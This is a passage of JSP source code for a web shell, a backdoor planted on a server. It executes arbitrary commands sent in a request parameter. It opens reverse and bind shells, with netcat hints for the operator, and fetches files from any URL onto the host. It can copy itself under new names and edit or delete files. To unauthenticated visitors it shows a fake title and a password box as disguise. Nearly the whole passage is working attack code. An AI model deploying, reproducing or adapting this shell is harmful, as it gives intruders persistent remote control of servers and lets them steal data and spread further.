			xCwd = xcleanpath(newdir);
		}
	}
	else if((request.getParameter("childname")!=null) && (!request.getParameter("childname").equals(""))){
		String childname = request.getParameter("childname").trim();
		String ortu = getServletConfig().getServletContext().getRealPath(request.getRequestURI());
		String con = xfileopen(ortu);
		xfilesave(xCwd+childname,con);
	}
}

if((request.getParameter("btnConnect")!=null) && (!request.getParameter("btnConnect").equals(""))){
	if((request.getParameter("bportC")!=null) && (is_numeric(request.getParameter("bportC")))){
		String port = request.getParameter("bportC");
		String base64 = "";
		if(is_win()) base64 = wBind;
		else base64 = xBack;
		if(xrunexploit(xCwd,base64,port,request.getRemoteAddr())){
		}
	}
}
else if((request.getParameter("btnListen")!=null) && (!request.getParameter("btnListen").equals(""))){
	if((request.getParameter("lportC")!=null) && (is_numeric(request.getParameter("lportC")))){
		String port = request.getParameter("lportC");
		String base64 = "";
		if(is_win()) base64 = wBind;
		else base64 = xBind;
		if(xrunexploit(xCwd,base64,port,"")){
		}
	}
}



if ((request.getContentType() != null)	&& (request.getContentType().toLowerCase().startsWith("multipart"))) {
	HttpMultiPartParser myParser = new HttpMultiPartParser();
	try{
		int bstart = request.getContentType().lastIndexOf("oundary=");
		String bound = request.getContentType().substring(bstart + 8);
		int clength = request.getContentLength();
		Hashtable ht = myParser.processData(request.getInputStream(), bound, xCwd, clength);
		if(ht.get("btnNewUploadUrl")!=null && !ht.get("btnNewUploadUrl").equals("")){
			if(ht.get("fileurl")!=null && !ht.get("fileurl").equals("")){
				URL myUrl = new URL(ht.get("fileurl").toString());
				URLConnection myCon = myUrl.openConnection();
				int conLength = myCon.getContentLength();
				InputStream raw = myCon.getInputStream();
				InputStream in = new BufferedInputStream(raw);
				byte[] data = new byte[conLength];
				int bytesRead = 0;
				int offset = 0;
				while(offset < conLength){
					bytesRead = in.read(data, offset, data.length - offset);
					if(bytesRead == -1) break;
					offset += bytesRead;
				}
				in.close();
				if(offset == conLength){
					String fname = myUrl.getFile();
					fname = fname.substring(fname.lastIndexOf('/')+1);
					if(ht.get("filename")!=null && !ht.get("filename").equals("")){
						fname = ht.get("filename").toString().trim();
					}
					FileOutputStream ooo = new FileOutputStream(xCwd + fname);
					ooo.write(data);ooo.flush();ooo.close();
				}
			}
		}
		else if(ht.get("btnNewUploadLocal")!=null && !ht.get("btnNewUploadLocal").equals("")){
			FileInfo fi = (FileInfo) ht.get("filelocal");
			String clientFileName = xCwd + fi.clientFileName.trim();
			if(ht.get("filename")!=null && !ht.get("filename").equals("")){
				String filename = xCwd + ht.get("filename").toString().trim();
				File clientFile = new File(clientFileName);
				clientFile.renameTo(new File(filename));
			}
		}
	}
	catch(Exception e){  }
}

if((request.getParameter("cmd")!=null) && (!request.getParameter("cmd").equals(""))){
	String cmd = urldecode(request.getParameter("cmd"));
	String newdir = "";
	if(cmd.toLowerCase().startsWith("cd ")){
		newdir = cmd.substring(3).trim();
		if(is_win()) newdir = newdir.replace("/","\\");
		if(newdir.equals("\\") && xCwd.length()>=3){ xCwd = xCwd.substring(0,3); }
		else if(newdir.equals(".")) { }
		else if(newdir.equals("..")) {
			xCwd = xcleanpath(xparentfolder(xCwd));
		}
		else{
			if(newdir.indexOf(":") > 0){
				if(is_dir(newdir)){	xCwd = xcleanpath(newdir); }
			}
			else if(is_dir(newdir)){
				xCwd = xcleanpath(newdir);
			}
			else{
				if(is_dir(xCwd + newdir)) { xCwd = xcleanpath(xCwd + newdir); }
			}
		}
		result = xdir(xCwd);
	}
	else if(cmd.matches("^\\w{1}:.*")){
		if(is_dir(cmd)){ xCwd = xcleanpath(cmd); }
		result = xdir(xCwd);
	}
	else {
		String result_ = htmlspecialchars(ekse(cmd,xCwd));
		if(!result_.equals("")) result = result_.replace("\n","<br />");
		else {
			result = xdir(xCwd);
		}
	}
	chdir(xCwd);
}
else if((request.getParameter("properties")!=null) && (!request.getParameter("properties").equals(""))){
	String fname = xcleanpath(urldecode(request.getParameter("properties")));
	String oldname = "";
	if((request.getParameter("oldfilename")!=null) && (!request.getParameter("oldfilename").equals(""))){
		oldname = request.getParameter("oldfilename");
		File oldfile = new File(oldname);
		oldfile.renameTo(new File(fname));
	}
	String dir = xCwd;
	String fcont = "";
	String fview = "";
	String fsize = "";
	String faction = "";
	String type = "";
	if(is_dir(fname)){
		fsize = "DIR";
		fcont = xdir(fname);
		faction = "<a href=\"?dir=" + xcleanpath(fname) + "&properties=" + xcleanpath(fname) + "\">Properties</a> | <a href=\"?dir=" + xcleanpath(xparentfolder(fname)) + "&del=" + xcleanpath(fname) + "\">Remove</a>";
	}
	else{
		fsize = xparsefilesize(xfilesize(fname)) + " <span class=\"gaul\">( </span>" + xfilesize(fname) + " bytes<span class=\"gaul\"> )</span>";
		if((request.getParameter("type")!=null) && (!request.getParameter("type").equals(""))) type = request.getParameter("type").trim();
		else{
			if(is_image(fname)) type = "img";
			else type = "text";
		}
		if(type.equals("img")){
			String imglink = "<p><a href=\"?img=" + fname + "\" target=\"_blank\"><span class=\"gaul\">[ </span>view full size<span class=\"gaul\"> ]</span></a></p>";
			fcont = "<div style=\"text-align:center;width:100%;\">" + imglink + "<img width=\"800\" src=\"?img=" + fname + "\" alt=\"\" style=\"margin:8px auto;padding:0;border:0;\" /></div>";
		}
		else{
			String code = htmlspecialchars(xfileopen(fname));
			fcont = "<div class=\"boxcode\">" + code.replace("\n","<br />") + "</div>";
		}

		faction = "<a href=\"?dir=" + xcleanpath(dir) + "&view=" + fname + "\">Edit</a> | <a href=\"?get=" + fname + "\">Download</a> | <a href=\"?dir=" + xcleanpath(dir) + "&del=" + fname + "\">Remove</a>";
		fview = "<a href=\"?dir=" + xcleanpath(dir) + "&properties=" + fname + "&type=text\"><span class=\"gaul\">[ </span>text<span class=\"gaul\"> ]</span></a><a href=\"?dir=" + xcleanpath(dir) + "&properties=" + fname + "&type=img\"><span class=\"gaul\">[ </span>image<span class=\"gaul\"> ]</span></a>";
	}
	String fperm = xfileperms(fname);
	String filemtime = xfilelastmodified(fname);
	result = "<div style=\"display:inline;\">" +
	"<form action=\"?\" method=\"get\" style=\"margin:0;padding:1px 8px;text-align:left;\">" +
	"<input type=\"hidden\" name=\"dir\" value=\"" + dir + "\" />" +
	"<input type=\"hidden\" name=\"oldfilename\" value=\"" + fname + "\" />" + faction + " | " +
	"<span><input style=\"width:50%;\" type=\"text\" name=\"properties\" value=\"" + fname + "\" />" +
	"&nbsp;<input style=\"width:120px\" class=\"btn\" type=\"submit\" name=\"btnRename\" value=\"Rename\" />" +
	"</span>" +
	"<div class=\"fprop\">" +
	"Size = " + fsize + "<br />" +
	"Permission = <span class=\"gaul\">( </span>" + fperm + "<span class=\"gaul\"> )</span><br />" +
	"Last Modified = <span class=\"gaul\">( </span>" + filemtime + "<span class=\"gaul\"> )</span><br />" +
	fview + "</div>" + fcont + "</form></div>";
}
else if(((request.getParameter("view")!=null) && (!request.getParameter("view").equals(""))) || ((request.getParameter("filename")!=null) && (!request.getParameter("filename").equals("")))){
	String mymsg = "";
	String pesan = "";
	String fpath = "";
	boolean dos = false;
	if((request.getParameter("save")!=null) && (!request.getParameter("save").equals(""))){
		if((request.getParameter("dos")!=null) && (request.getParameter("dos").equals("true"))){ dos = true; }
		String saveas = request.getParameter("saveas");
		BufferedWriter outs = new BufferedWriter(new FileWriter(saveas));
		StringReader text = new StringReader(request.getParameter("filesource"));
		int i;
		boolean cr = false;
		String lineend = "\n";
		if (dos) lineend = "\r\n";
		while ((i = text.read()) >= 0) {
			if (i == '\r') cr = true;
			else if (i == '\n') {
				outs.write(lineend);
				cr = false;
			}
			else if (cr) {
				outs.write(lineend);
				cr = false;
			}
			else {
				outs.write(i);
				cr = false;
			}
		}
		outs.flush();
		outs.close();

		if(is_file(saveas)) pesan = "File Saved";
		else pesan = "Failed to save file";
		mymsg = "<span style=\"float:right;\"><span class=\"gaul\">[ </span>" + pesan + "<span class=\"gaul\"> ]</span></span>";
	}
	if((request.getParameter("view")!=null) && (!request.getParameter("view").equals(""))) {
		fpath = request.getParameter("view");
		if((request.getParameter("saveas")!=null) && (!request.getParameter("saveas").equals(""))){
			fpath = request.getParameter("saveas");
		}
	}
	else fpath = xCwd + request.getParameter("filename");

	StringBuffer result_ = new StringBuffer("");;
	BufferedReader reader = new BufferedReader(new FileReader(fpath));
	int i;

	boolean cr = false;
	while ((i = reader.read()) >= 0) {
		result_.append((char) i);
		if (i == '\r') cr = true;
		else if (cr && (i == '\n')) dos = true;
		else cr = false;
	}
	reader.close();
	String doz = "";if(dos) doz="true";else doz="false";
	result = "<p style=\"padding:0;margin:0;text-align:left;\"><a href=\"?dir=" + xCwd + "&properties=" + fpath + "\">" + xfilesummary(fpath) + "</a>" + mymsg + "</p><div style=\"clear:both;margin:0;padding:0;\"></div>" +
	"<form action=\"?dir=" + xCwd + "&view=" + fpath + "\" method=\"post\">" +
	"<textarea name=\"filesource\" style=\"width:100%;height:200px;\">" + result_ + "</textarea>" +
	"<input type=\"text\" style=\"width:80%;\"  name=\"saveas\" value=\"" + fpath + "\" />" +
	"<input type=\"hidden\" style=\"width:80%;\"  name=\"dos\" value=\"" + doz + "\" />" +
	"&nbsp;<input type=\"submit\" class=\"btn\" style=\"width:120px;\" name=\"save\" value=\"Save As\" />" +
	"</form>";
}
else{
	result = xdir(xCwd);
}
//################# Finalizing #######################======================================================]
File xcfile = new File(".");
xCwd = xcfile.getCanonicalPath();
String html_title = "";
String html_head = "";
String html_body = "";
if(auth){
	String bportC = "";
	String lportC = "";
	if(request.getParameter("bportC")!=null) bportC = request.getParameter("bportC");
	else bportC = shell_fav_port;
	if(request.getParameter("lportC")!=null) lportC = request.getParameter("lportC");
	else lportC = shell_fav_port;

	html_title = shell_title + " " + xCwd;
	html_head = "<title>" + html_title + "</title>" +
"<link rel=\"SHORTCUT ICON\" href=\"" + script_name + "?img=icon\" />" + shell_style +
"<script type=\"text/javascript\">" +
"function updateInfo(boxid,typ){" +
"	if(typ == 0){" +
"		var pola = 'example: (using netcat) run &quot;nc -l -p __PORT__&quot; and then press Connect';	" +
"	}" +
"	else{" +
"		var pola = 'example: (using netcat) press &quot;Listen&quot; and then run &quot;nc " + xServerIP + " __PORT__&quot;';	" +
"	}" +
"	var portnum = document.getElementById(boxid).value;" +
"	var hasil = pola.replace('__PORT__', portnum);" +
"	document.getElementById(boxid+'_').innerHTML = hasil;" +
"}" +
"function show(boxid){" +
"	var box = document.getElementById(boxid);" +
"	if(box.style.display != 'inline'){" +
"		document.getElementById('newfile').style.display = 'none';" +
"		document.getElementById('newfolder').style.display = 'none';" +
"		document.getElementById('newupload').style.display = 'none';" +
"		document.getElementById('newchild').style.display = 'none';" +
"		document.getElementById('newconnect').style.display = 'none';" +
"		box.style.display = 'inline';" +
"		box.focus();" +
"	}" +
"	else box.style.display = 'none';" +
"}" +
"function highlighthexdump(address){" +
"	var target = document.getElementById(address);" +
"	target.style.background = '" + shell_color + "';" +
"}" +
"function unhighlighthexdump(address){" +
"	var target = document.getElementById(address);" +
"	target.style.background = 'none';" +
"}" +
"</script>";
html_body = "<div id=\"wrapper\">" +
"<h1 onmouseover=\"this.style.cursor='pointer';this.style.cursor='hand';\"  onclick=\"window.location= '?';\"><a href=\"?\">" + shell_title + "</a></h1>" +
"<div class=\"box\">" + xHeader +
"<div class=\"fpath\">" + xdrive() + xparsedir(xCwd) +
"</div>" +
"<div class=\"menu\">" +
"<a href=\"javascript:show('newfile');\"><span class=\"gaul\">[ </span> New File<span class=\"gaul\"> ]</span></a>&nbsp;" +
"<a href=\"javascript:show('newfolder');\"><span class=\"gaul\">[ </span>New Folder<span class=\"gaul\"> ]</span></a>&nbsp;" +
"<a href=\"javascript:show('newchild');\"><span class=\"gaul\">[ </span>Replicate<span class=\"gaul\"> ]</span></a>&nbsp;" +
"<a href=\"javascript:show('newupload');\"><span class=\"gaul\">[ </span>Upload<span class=\"gaul\"> ]</span></a>&nbsp;" +
"<a href=\"javascript:show('newconnect');\"><span class=\"gaul\">[ </span>BindShell<span class=\"gaul\"> ]</span></a>&nbsp;" +
"</div>" +
"<div class=\"hidden\" id=\"newconnect\">" +
"<form method=\"get\" action=\"?\" style=\"display:inline;margin:0;padding:0;\">" +
"<table class=\"tblBox\" style=\"width:100%;\">" +
"<input type=\"hidden\" name=\"dir\" value=\"" + xCwd + "\" />" +
"<tr><td style=\"width:130px;\">BackConnect</td><td style=\"width:200px;\">" +
"Port&nbsp;<input maxlength=\"5\" id=\"backC\" onkeyup=\"updateInfo('backC',0);\" style=\"width:60px;\" type=\"text\" name=\"bportC\" value=\"" + bportC + "\" />" +
"&nbsp;<input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnConnect\" value=\"Connect\" />" +
"</td>" +
"<td><span id=\"backC_\" class=\"msgcon\">example: (using netcat) run &quot;nc -l -p " + bportC + "&quot; and then press Connect</span></td>" +
"</tr>" +
"<tr><td>Listen</td><td>" +
"Port&nbsp;<input maxlength=\"5\" id=\"listenC\" onkeyup=\"updateInfo('listenC',1);\" style=\"width:60px;\" type=\"text\" name=\"lportC\" value=\"" + lportC + "\" />" +
"&nbsp;<input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnListen\" value=\"Listen\" />" +
"</td>" +
"<td><span id=\"listenC_\" class=\"msgcon\">example: (using netcat) press &quot;Listen&quot; and then run &quot;nc " + xServerIP + " " + lportC + "&quot;</span></td>" +
"</tr></table></form></div>" +
"<div class=\"hidden\" id=\"newfolder\">" +
"<form method=\"get\" action=\"?\" style=\"display:inline;margin:0;padding:0;\">" +
"<input type=\"hidden\" name=\"dir\" value=\"" + xCwd + "\" />" +
"<table class=\"tblBox\" style=\"width:560px;\">" +
"<tr><td style=\"width:120px;\">New Foldername</td><td style=\"width:304px;\">" +
"<input style=\"width:300px;\" type=\"text\" name=\"foldername\" value=\"newfolder\" />" +
"</td><td>" +
"<input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewfolder\" value=\"Create\" />" +
"</td></tr></table></form></div>" +
"<div class=\"hidden\" id=\"newfile\">" +
"<form action=\"?\" method=\"get\" style=\"display:inline;margin:0;padding:0;\">" +
"<input type=\"hidden\" name=\"dir\" value=\"" + xCwd + "\" />" +
"<table class=\"tblBox\" style=\"width:560px;\">" +
"<tr><td style=\"width:120px;\">New Filename</td><td style=\"width:304px;\">" +
"<input style=\"width:300px;\" type=\"text\" name=\"filename\" value=\"newfile\" />" +
"</td><td>" +
"<input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewfile\" value=\"Create\" />" +
"</td></tr></form></table></div>" +
"<div class=\"hidden\" id=\"newupload\">" +
"<form method=\"post\" action=\"?dir=" + xCwd + "\" enctype=\"multipart/form-data\" style=\"display:inline;margin:0;padding:0;\">" +
"<table class=\"tblBox\" style=\"width:560px;\">" +
"<tr><td style=\"width:120px;\">Save as</td><td><input style=\"width:300px;\" type=\"text\" name=\"filename\" value=\"\" /></td></tr>" +
"<tr><td style=\"width:120px;\">From Url</td><td style=\"width:304px;\">" +
"<input style=\"width:300px;\" type=\"text\" name=\"fileurl\" value=\"\" />" +
"</td><td><input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewUploadUrl\" value=\"Get\" /></td></tr>" +
"<tr><td style=\"width:120px;\">From Computer</td><td style=\"width:304px;\">" +
"<input style=\"width:300px;\" type=\"file\" name=\"filelocal\" />" +
"</td><td><input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewUploadLocal\" value=\"Get\" />" +
"</td></tr></table></form></div>" +
"<div class=\"hidden\" id=\"newchild\">" +
"<form method=\"get\" action=\"?\" style=\"display:inline;margin:0;padding:0;\">" +
"<input type=\"hidden\" name=\"dir\" value=\"" + xCwd + "\" />" +
"<table class=\"tblBox\" style=\"width:560px;\">" +
"<tr><td style=\"width:120px;\">New Shellname</td><td style=\"width:304px;\">" +
"<input style=\"width:300px;\" type=\"text\" name=\"childname\" value=\"" + shell_name + ".jsp\"; />" +
"</td><td><input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewchild\" value=\"Create\" />" +
"</td></tr></table></form></div>" +
"<div class=\"bottomwrapper\">" +
"<div class=\"cmdbox\">" +
"<form action=\"?\" method=\"get\">" +
"<input type=\"hidden\" name=\"dir\" value=\"" + xCwd + "\" />" +
"<table style=\"width:100%;\"><tr>" +
"<td style=\"width:88%;\"><input type=\"text\" id=\"cmd\" name=\"cmd\" value=\"\" style=\"width:100%;\" /></td>" +
"<td style=\"width:10%;\"><input type=\"submit\" class=\"btn\" name=\"btnCommand\" style=\"width:120px;\" value=\"Execute\" /></td></tr></table>" +
"</form>" +
"</div>" +
"<div class=\"result\" id=\"result\">" + result +
"</div></div></div></div>";
}
else {
	html_title = shell_fake_name;
	html_head = "<title>" + html_title + "</title>" + shell_style;
	html_body = "<div style=\"margin:30px;\">" +
"<div>" +
"<form action=\"?\" method=\"post\">" +
"<input id=\"cmd\" type=\"text\" name=\"passw\" value=\"\" />" +
"<input type=\"submit\" name=\"btnpasswd\" value=\"Ok\" />" +
"</form>" +
"</div>" +
"<div style=\"font-size:10px;\">" + shell_fake_name + "</div>" +
"</div>";
}
String html_onload = "";
if((request.getParameter("cmd")!=null) || (request.getParameter("passw")!=null)){
	html_onload = " onload=\"document.getElementById('cmd').focus();\"";
}
else html_onload = "";

String html_final = "<html><head>" + html_head +
"</head>" +
"<body" + html_onload + ">" +
"<div id=\"mainwrapper\">" + html_body +
"</div></body></html>";
%><% out.println(html_final.replace("\\s+"," ").trim()); %>